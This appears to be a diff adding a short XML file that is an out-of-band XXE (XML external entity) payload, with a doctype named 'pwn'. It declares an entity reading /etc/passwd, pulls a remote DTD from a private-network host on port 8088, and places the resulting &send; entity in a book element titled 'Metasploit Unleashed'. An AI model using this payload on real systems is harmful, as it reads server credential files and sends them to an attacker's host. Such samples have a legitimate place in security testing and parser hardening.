@@ -1,0 +1,10 @@
+<?xml version="1.0"?>
+<!DOCTYPE pwn  [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://192.168.48.232:8088/payload.dtd">
+%dtd;]>
+<book>
+    <author>&send;</author>
+    <isbn>11112222333</isbn>
+    <title>Metasploit Unleashed</title>
+</book>
